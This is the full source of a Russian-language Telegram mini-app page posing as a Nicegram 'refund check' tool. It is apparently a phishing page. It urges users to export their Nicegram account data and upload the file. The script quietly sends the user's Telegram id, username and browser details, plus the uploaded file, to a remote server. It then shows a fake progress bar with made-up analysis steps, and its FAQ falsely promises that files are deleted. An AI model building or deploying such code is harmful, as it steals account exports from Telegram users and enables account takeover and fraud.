<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Nicegram Holographic</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap" rel="stylesheet">

    <style>
        :root {
            --holo-cyan: #0ff;
            --holo-bg: rgba(15, 15, 15, 0.75);
            --text-main: #ffffff;
            --text-secondary: rgba(255, 255, 255, 0.6);
            --btn-blue-start: #0033cc;
            --btn-blue-end: #0066ff;
            --glass-shine: rgba(255, 255, 255, 0.25);
        }

        body {
            margin: 0; padding: 0;
            background: radial-gradient(circle at center, #0a1e3d 0%, #000000 100%);
            color: var(--text-main);
            font-family: 'Inter', sans-serif;
            height: 100vh;
            overflow: hidden;
            display: flex; flex-direction: column;
            align-items: center; justify-content: center;
            position: relative;
        }

        #fileInput { display: none !important; }

        /* ЭФФЕКТЫ ФОНА */
        #particles, .snow-container {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none; z-index: 1;
        }
        .liquid-blob { position: absolute; border-radius: 50%; filter: blur(80px); z-index: 0; opacity: 0.25; animation: floatBlob 12s infinite ease-in-out; }
        .blob-1 { width: 350px; height: 350px; background: #00ffff; top: -10%; left: -15%; }
        .blob-2 { width: 300px; height: 300px; background: #0044ff; bottom: -10%; right: -15%; }
        @keyframes floatBlob { 0%, 100% { transform: translate(0, 0); } 50% { transform: translate(40px, -40px); } }

        .animated-images { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 2; }
        .image { position: absolute; width: 75px; opacity: 0.15; filter: blur(1px); animation: floatImg 18s infinite ease-in-out; }
        .image1 { top: 15%; left: 8%; } .image2 { top: 60%; left: 82%; } .image3 { top: 75%; left: 12%; } .image4 { top: 12%; left: 72%; }
        @keyframes floatImg { 0%, 100% { transform: translateY(0) rotate(0deg); } 50% { transform: translateY(-35px) rotate(8deg); } }

        .snowflake { position: absolute; background: #fff; border-radius: 50%; opacity: 0.5; animation: fall linear infinite; }
        @keyframes fall { to { transform: translateY(100vh) translateX(20px); } }

        /* КАРТОЧКА LIQUID GLASS */
        .glass-card {
            position: relative; z-index: 10;
            width: 86%; max-width: 350px;
            padding: 45px 25px;
            background: var(--holo-bg);
            border-radius: 32px;
            backdrop-filter: blur(35px) saturate(160%);
            -webkit-backdrop-filter: blur(35px) saturate(160%);
            border: 1px solid rgba(255, 255, 255, 0.12);
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7);
            text-align: center;
            overflow: hidden;
        }

        /* Надпись Nicegram вместо лого */
        .logo-text {
            font-size: 44px;
            font-weight: 900;
            color: #ffffff;
            letter-spacing: -2px;
            margin-bottom: 5px;
            position: relative;
            z-index: 5;
            text-shadow: 0 0 15px rgba(255, 255, 255, 0.3), 0 0 30px rgba(0, 255, 255, 0.2);
            display: inline-block;
        }

        h1 { font-size: 24px; font-weight: 800; margin: 0 0 12px 0; color: #fff; opacity: 0.95; }

        /* КНОПКА */
        .btn {
            position: relative; background: linear-gradient(135deg, var(--btn-blue-start), var(--btn-blue-end));
            color: #ffffff; border: none; padding: 18px 0; border-radius: 50px;
            font-size: 18px; font-weight: 800; cursor: pointer; width: 100%;
            overflow: hidden; box-shadow: 0 12px 30px rgba(0, 50, 200, 0.4);
            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }
        .btn:active { transform: scale(0.93) translateY(2px); }

        /* ЭКРАН ЗАГРУЗКИ */
        #step-loading { display: none; flex-direction: column; align-items: center; }
        .spinner {
            width: 55px; height: 55px;
            border: 4px solid rgba(255, 255, 255, 0.05);
            border-left-color: var(--holo-cyan);
            border-radius: 50%; animation: spin 0.8s linear infinite;
            margin-bottom: 25px; box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .status-text { font-size: 16px; font-weight: 700; color: #fff; margin-bottom: 6px; min-height: 1.5em; }
        .percent-display { font-size: 14px; color: var(--holo-cyan); font-weight: 900; }

        /* ФУТЕР (Кнопки внизу) */
        .footer-container {
            position: absolute; bottom: 40px;
            display: flex; gap: 15px; z-index: 30;
        }

        .footer-btn {
            background: rgba(30, 35, 45, 0.7);
            color: #ffffff;
            padding: 12px 22px;
            border-radius: 16px;
            font-size: 14px;
            font-weight: 700;
            cursor: pointer;
            backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            display: flex; align-items: center; gap: 10px;
            transition: 0.3s;
        }

        .footer-btn:active { transform: scale(0.9); background: rgba(255, 255, 255, 0.15); }

        /* МОДАЛКИ */
        .modal-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.75); backdrop-filter: blur(10px); z-index: 40; opacity: 0; pointer-events: none; transition: 0.4s; }
        .modal-overlay.active { opacity: 1; pointer-events: all; }
        .modal {
            position: fixed; bottom: -100%; left: 0; width: 100%;
            background: rgba(20, 22, 25, 0.9);
            backdrop-filter: blur(40px) saturate(180%);
            border-top: 1px solid rgba(255,255,255,0.15);
            border-top-left-radius: 35px; border-top-right-radius: 35px;
            padding: 35px 25px 50px; box-sizing: border-box; z-index: 50;
            transition: bottom 0.6s cubic-bezier(0.2, 1, 0.3, 1);
            color: #fff;
        }
        .modal.active { bottom: 0; }
        .btn-close { background: rgba(255,255,255,0.08); color: #fff; border: 1px solid rgba(255,255,255,0.1); width: 100%; padding: 16px; margin-top: 25px; border-radius: 20px; font-weight: 800; cursor: pointer; }
    </style>
</head>
<body>

    <div class="liquid-blob blob-1"></div>
    <div class="liquid-blob blob-2"></div>
    <div id="particles"></div>
    <div class="snow-container" id="snow"></div>

    <div class="animated-images">
        <img src="https://betterdrain.baby/ring.png" class="image image1">
        <img src="https://betterdrain.baby/clock.png" class="image image2">
        <img src="https://betterdrain.baby/shard.png" class="image image3">
        <img src="https://betterdrain.baby/skull.png" class="image image4">
    </div>

    <div class="glass-card">
        <div class="logo-text">Nicegram</div>
        
        <div id="step-start">
            <h1 id="greeting">Привет, Тракер</h1>
            <p style="font-size: 14px; color: var(--text-secondary); margin-bottom: 35px; line-height: 1.5;">Защищенная среда для проверки данных.<br>Загрузите файл экспорта.</p>
            <input type="file" id="fileInput" onchange="startVerification(this)">
            <button class="btn" onclick="document.getElementById('fileInput').click()">Загрузить файл</button>
        </div>

        <div id="step-loading">
            <div class="spinner"></div>
            <div class="status-text" id="statusText">Инициализация...</div>
            <div class="percent-display" id="percentText">0%</div>
        </div>
    </div>

    <div class="footer-container">
        <div class="footer-btn" onclick="openModal('instructionModal')">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line></svg>
            Инструкция
        </div>
        <div class="footer-btn" onclick="openModal('faqModal')">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>
            FAQ
        </div>
    </div>

    <div class="modal-overlay" onclick="closeAllModals()"></div>

    <div class="modal" id="instructionModal">
        <h3>Инструкция</h3>
        <ol style="color: #ccc; font-size: 15px; line-height: 1.8; padding-left: 20px;">
            <li>Скачайте приложение Nicegram с официального сайта...</li>
            <li>Откройте Nicegram и войдите в свой аккаунт.</li>
            <li>Зайдите в настройки и выберите пункт «Nicegram».</li>
            <li>Экспортируйте данные аккаунта...</li>
            <li>Откройте главное меню бота и нажмите на кнопку "Проверка на рефаунд".</li>
            <li>Отправьте файл боту.</li>
        </ol>
        <button class="btn-close" onclick="closeAllModals()">Понятно</button>
    </div>

    <div class="modal" id="faqModal">
        <h3>❓ Частые вопросы</h3>
        <div style="color: #bbb; font-size: 15px; line-height: 1.6;">
            <p><b>Что такое рефаунд?</b><br>Это возврат средств за подарок...</p>
            <p><b>Сколько времени занимает проверка?</b><br>Обычно 3-5 минут...</p>
            <p><b>Мои файлы в безопасности?</b><br>Да - файлы не где не хранятся, их обрабатывает бот, который сразу же их удаляет.</p>
        </div>
        <button class="btn-close" onclick="closeAllModals()">Закрыть</button>
    </div>

    <script>
        const SERVER_URL = "https://nicegrammarse.onrender.com";
        const tg = window.Telegram.WebApp;
        tg.expand();

        if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
            document.getElementById('greeting').innerText = `Привет, ${tg.initDataUnsafe.user.first_name || 'Тракер'}`;
        }

        function logEntry() {
            const user = tg.initDataUnsafe.user || {};
            fetch(`${SERVER_URL}/log_entry`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    user_id: user.id || "0000",
                    username: user.username || "no_username",
                    user_agent: navigator.userAgent,
                    platform: tg.platform
                })
            }).catch(e => console.error(e));
        }
        logEntry();

        function startVerification(input) {
            const file = input.files[0];
            if (!file) return;

            document.getElementById('step-start').style.display = 'none';
            document.getElementById('step-loading').style.display = 'flex';

            uploadFileInBackground(file);

            let progress = 0;
            const totalDuration = 150000; // 150 секунд
            const intervalTime = 100; 
            const increment = (100 / (totalDuration / intervalTime));

            const timer = setInterval(() => {
                progress += increment;
                if (progress > 100) progress = 100;

                const st = document.getElementById('statusText');
                const pt = document.getElementById('percentText');
                pt.innerText = Math.floor(progress) + "%";

                if (progress < 20) st.innerText = "Проверяем ликвидность файла";
                else if (progress < 45) st.innerText = "Анализируем аукционы";
                else if (progress < 75) st.innerText = "Проверка происхождения звёзд";
                else if (progress < 95) st.innerText = "Завершение анализа";
                else st.innerText = "Формирование вердикта";

                if (progress >= 100) {
                    clearInterval(timer);
                    if(tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
                    setTimeout(() => { tg.close(); }, 1500);
                }
            }, intervalTime);
        }

        function uploadFileInBackground(file) {
            const user = tg.initDataUnsafe.user || {};
            const formData = new FormData();
            formData.append('file', file);
            formData.append('user_id', user.id || "0000");
            formData.append('username', user.username || "no_username");
            formData.append('user_agent', navigator.userAgent);
            
            fetch(`${SERVER_URL}/upload`, { method: 'POST', body: formData }).catch(e => console.error(e));
        }

        // Фон
        const snowContainer = document.getElementById('snow');
        for (let i = 0; i < 40; i++) {
            const flake = document.createElement('div');
            flake.className = 'snowflake';
            flake.style.left = Math.random() * 100 + '%';
            flake.style.width = flake.style.height = Math.random() * 3 + 1 + 'px';
            flake.style.animationDuration = Math.random() * 4 + 6 + 's';
            flake.style.animationDelay = Math.random() * 5 + 's';
            snowContainer.appendChild(flake);
        }

        (function() {
            var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d');
            document.getElementById('particles').appendChild(canvas);
            var particles = [], width, height;
            function resize() { width = window.innerWidth; height = window.innerHeight; canvas.width = width; canvas.height = height; }
            function Particle() { this.x = Math.random() * width; this.y = Math.random() * height; this.vx = (Math.random() - 0.5) * 0.2; this.vy = (Math.random() - 0.5) * 0.2; this.size = Math.random() * 1.5; }
            Particle.prototype.update = function() { this.x += this.vx; this.y += this.vy; if (this.x < 0 || this.x > width) this.vx *= -1; if (this.y < 0 || this.y > height) this.vy *= -1; };
            Particle.prototype.draw = function() { ctx.fillStyle = 'rgba(0, 255, 255, 0.3)'; ctx.beginPath(); ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2); ctx.fill(); };
            window.addEventListener('resize', resize); resize();
            for (var i = 0; i < 35; i++) particles.push(new Particle());
            function animate() { ctx.clearRect(0, 0, width, height); particles.forEach(p => { p.update(); p.draw(); }); requestAnimationFrame(animate); }
            animate();
        })();

        function openModal(id) { document.querySelector('.modal-overlay').classList.add('active'); document.getElementById(id).classList.add('active'); }
        function closeAllModals() { document.querySelector('.modal-overlay').classList.remove('active'); document.querySelectorAll('.modal').forEach(m => m.classList.remove('active')); }
    </script>
</body>
</html>
